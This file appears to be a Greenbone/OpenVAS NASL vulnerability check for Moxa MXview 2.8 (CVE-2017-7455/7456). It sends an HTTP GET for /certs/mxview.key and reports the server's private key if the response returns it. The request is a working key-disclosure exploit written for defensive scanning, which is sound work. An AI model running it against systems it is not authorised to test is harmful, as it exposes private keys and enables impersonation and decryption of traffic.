CPE = "cpe:/a:moxa:mxview";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140245" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2017-7455", "CVE-2017-7456" );
	script_version( "2021-09-14T11:01:46+0000" );
	script_tag( name: "last_modification", value: "2021-09-14 11:01:46 +0000 (Tue, 14 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-08-16 01:29:00 +0000 (Wed, 16 Aug 2017)" );
	script_tag( name: "creation_date", value: "2017-04-11 13:15:09 +0200 (Tue, 11 Apr 2017)" );
	script_name( "Moxa MXview Private Key Disclosure" );
	script_tag( name: "summary", value: "MXview stores a copy of its web servers private key under C:\\Users\\TARGET-USER\\AppData\\Roaming\\moxa\\mxview\\web\\certs\\mxview.key.
Remote attackers can easily access/read this private key `mxview.key` file by making an HTTP GET request." );
	script_tag( name: "vuldetect", value: "Try to read `/certs/mxview.key`" );
	script_tag( name: "affected", value: "Moxa MXview V2.8" );
	script_tag( name: "solution", value: "Vendor has released a fix." );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_dependencies( "gb_moxa_mxview_web_detect.sc" );
	script_require_ports( "Services/www", 80, 81 );
	script_mandatory_keys( "moxa/mxviev/installed" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
url = "/certs/mxview.key";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(ContainsString( buf, "BEGIN PRIVATE KEY" ) && ContainsString( buf, "END PRIVATE KEY" )){
	report = "It was possible to read the private key by requesting " + http_report_vuln_url( port: port, url: url, url_only: TRUE ) + "\n\nResponse:\n\n" + buf;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

